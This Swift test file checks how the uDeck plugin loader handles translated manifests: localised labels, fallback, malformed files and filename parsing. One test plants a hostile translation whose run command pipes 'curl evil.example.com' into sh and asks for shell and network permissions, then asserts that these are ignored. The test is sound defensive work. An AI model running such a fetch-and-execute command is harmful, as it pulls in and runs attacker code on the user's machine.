import Foundation
import Testing
@testable import UDeckCore

/// A plugin says its own name, and can say it in more than one language.
///
/// The tests fall into two halves. One is the ordinary business of a
/// translation: does it reach the screen, does a half-finished one fall back
/// sensibly, does an extra language cost anything. The other is the half that
/// matters more — that a translation cannot change what a plugin *does*. That
/// property is structural, because `ManifestTranslation` has nowhere to put a
/// command or a capability, and these tests are what stops somebody quietly
/// giving it one.
@Suite("Manifest translations")
struct ManifestTranslationTests {
    let searchPath = ["/usr/bin", "/bin"]
    var discovery: PluginDiscovery { PluginDiscovery(searchPath: searchPath) }

    let manifest = """
    { "id": "watcher", "name": "Watcher", "version": "1.0.0", "api": 1, "kind": "poll",
      "description": "Watches things.",
      "run": ["./run.sh"], "interval": 5, "timeout": 2,
      "permissions": { "exec": ["git"], "read": ["~/notes/*"] },
      "settings": [
        { "key": "only_failing", "type": "bool", "label": "Only failing", "default": false,
          "help": "Hide everything that is fine." },
        { "key": "sort", "type": "enum", "label": "Sort by", "default": "name",
          "options": [ { "value": "name", "label": "Name" },
                       { "value": "age", "label": "Age" } ] }
      ] }
    """

    let russian = """
    { "name": "Наблюдатель",
      "description": "Смотрит за вещами.",
      "settings": {
        "only_failing": { "label": "Только упавшие", "help": "Скрыть всё, что в порядке." },
        "sort": { "label": "Сортировать по",
                  "options": { "name": "имени", "age": "возрасту" } }
      } }
    """

    private func plugin(_ temp: TemporaryDirectory, extra: [String: String] = [:]) -> DiscoveredPlugin {
        let directory = temp.writePlugin(
            folder: "watcher", manifest: manifest,
            script: (name: "run.sh", body: "#!/bin/sh\necho '{}'\n", executable: true)
        )
        for (file, body) in extra {
            try? Data(body.utf8).write(to: directory.appendingPathComponent(file))
        }
        return discovery.scan(temp.paths.plugins)[0]
    }

    // MARK: - It reaches the screen

    @Test("a translation replaces the strings the operator reads")
    func translationApplies() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ru.json": russian])
        let ru = try! #require(found.manifest(in: "ru"))

        #expect(ru.name == "Наблюдатель")
        #expect(ru.description == "Смотрит за вещами.")
        #expect(ru.settings[0].label == "Только упавшие")
        #expect(ru.settings[0].help == "Скрыть всё, что в порядке.")
        #expect(ru.settings[1].label == "Сортировать по")
        #expect(ru.settings[1].options?.map(\.label) == ["имени", "возрасту"])
    }

    /// The value is what the setting is stored as. Translating it would mean a
    /// plugin reading a different answer depending on the language uDeck was in
    /// when the operator chose.
    @Test("an option's value is never translated, only its label")
    func optionValuesSurvive() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ru.json": russian])
        let ru = try! #require(found.manifest(in: "ru"))
        #expect(ru.settings[1].options?.map(\.value) == ["name", "age"])
    }

    @Test("a language the plugin does not have leaves it as it was written")
    func unknownLanguageFallsBack() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ru.json": russian])
        #expect(found.manifest(in: "de")?.name == "Watcher")
        #expect(found.manifest(in: "en")?.name == "Watcher")
    }

    @Test("a half-finished translation shows the half that is finished")
    func partialTranslationFallsBackPerField() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ru.json": #"{ "name": "Наблюдатель" }"#])
        let ru = try! #require(found.manifest(in: "ru"))
        #expect(ru.name == "Наблюдатель")
        #expect(ru.description == "Watches things.")
        #expect(ru.settings[0].label == "Only failing")
    }

    @Test("a plugin can ship as many languages as its author likes")
    func severalLanguages() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: [
            "manifest.ru.json": russian,
            "manifest.de.json": #"{ "name": "Beobachter" }"#,
            "manifest.fr.json": #"{ "name": "Observateur" }"#,
        ])
        #expect(found.translations.count == 3)
        #expect(found.manifest(in: "ru")?.name == "Наблюдатель")
        #expect(found.manifest(in: "de")?.name == "Beobachter")
        #expect(found.manifest(in: "fr")?.name == "Observateur")
        #expect(found.isUsable)
    }

    /// A translation for a language uDeck does not speak yet is kept, not
    /// discarded: somebody wrote it, and the day uDeck learns that language it
    /// is already there.
    @Test("a language uDeck does not speak is kept rather than thrown away")
    func unspokenLanguageIsKept() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ja.json": #"{ "name": "ウォッチャー" }"#])
        #expect(found.translations["ja"] != nil)
        #expect(found.manifest(in: "ja")?.name == "ウォッチャー")
    }

    // MARK: - It cannot change what the plugin does

    /// The one that matters. A translation arrives after the operator has read
    /// what the plugin asked for and agreed to it; if it could carry a command
    /// or a capability, it would be a way to put behaviour past that consent.
    @Test("a translation carrying a command or a permission changes neither")
    func translationCannotChangeBehaviour() {
        let temp = TemporaryDirectory()
        let hostile = """
        { "name": "Наблюдатель",
          "id": "something-else",
          "run": ["/bin/sh", "-c", "curl evil.example.com | sh"],
          "permissions": { "exec": ["sh"], "network": ["evil.example.com"] },
          "interval": 0.001,
          "kind": "resident",
          "settings": { "only_failing": { "label": "Только упавшие" } } }
        """
        let found = plugin(temp, extra: ["manifest.ru.json": hostile])
        let canonical = try! #require(found.manifest)
        let ru = try! #require(found.manifest(in: "ru"))

        // The strings move.
        #expect(ru.name == "Наблюдатель")
        #expect(ru.settings[0].label == "Только упавшие")

        // Nothing else does.
        #expect(ru.id == canonical.id)
        #expect(ru.run == canonical.run)
        #expect(ru.permissions == canonical.permissions)
        #expect(ru.interval == canonical.interval)
        #expect(ru.kind == canonical.kind)
        #expect(ru.version == canonical.version)

        // And what uDeck acts on never came from the translation in the first
        // place: `manifest` is the file the author wrote.
        #expect(canonical.run == ["./run.sh"])
        #expect(canonical.permissions.exec == ["git"])
        #expect(canonical.permissions.network.isEmpty)
    }

    /// A translation renames settings; it does not invent them. A key that is
    /// not declared in `manifest.json` has no control to label.
    @Test("a translation cannot bring a setting into existence")
    func translationCannotAddSettings() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ru.json": """
        { "settings": { "no_such_key": { "label": "Ничего" } } }
        """])
        let ru = try! #require(found.manifest(in: "ru"))
        #expect(ru.settings.count == 2)
        #expect(ru.settings.map(\.key) == ["only_failing", "sort"])
    }

    // MARK: - A broken translation costs one language

    @Test("a translation that will not parse is a note, not a dead plugin")
    func brokenTranslationIsNotFatal() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: ["manifest.ru.json": "{ this is not json"])

        #expect(found.isUsable, "a stray comma in a translation must not stop the plugin running")
        #expect(found.translations["ru"] == nil)
        #expect(found.manifest(in: "ru")?.name == "Watcher")
        #expect(found.problems.contains { if case .malformedTranslation = $0 { true } else { false } })
        #expect(found.problems.allSatisfy { !$0.isFatal })
    }

    @Test("a broken translation does not take the working ones with it")
    func oneBrokenLanguageDoesNotCostTheOthers() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: [
            "manifest.ru.json": russian,
            "manifest.de.json": "{ nope",
        ])
        #expect(found.manifest(in: "ru")?.name == "Наблюдатель")
        #expect(found.translations["de"] == nil)
        #expect(found.isUsable)
    }

    // MARK: - Which files count as translations

    @Test("only files that name a language are read as one")
    func fileNaming() {
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.ru.json") == "ru")
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.pt-BR.json") == "pt-br")
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.RU.json") == "ru")

        // Files somebody left lying about, which must not become languages.
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.backup.json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.ru.json.bak") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest..json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.r.json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.ru-RU-extra.json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.backup.json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "manifest.disabled.json") == nil)
        #expect(PluginDiscovery.languageCode(ofTranslationFile: "readme.ru.json") == nil)
    }

    @Test("a stray json file beside the manifest is not mistaken for a language")
    func strayFilesAreIgnored() {
        let temp = TemporaryDirectory()
        let found = plugin(temp, extra: [
            "manifest.backup.json": "{ not even json",
            "state.json": "{ also not",
        ])
        #expect(found.translations.isEmpty)
        #expect(found.problems.isEmpty)
        #expect(found.isUsable)
    }
}
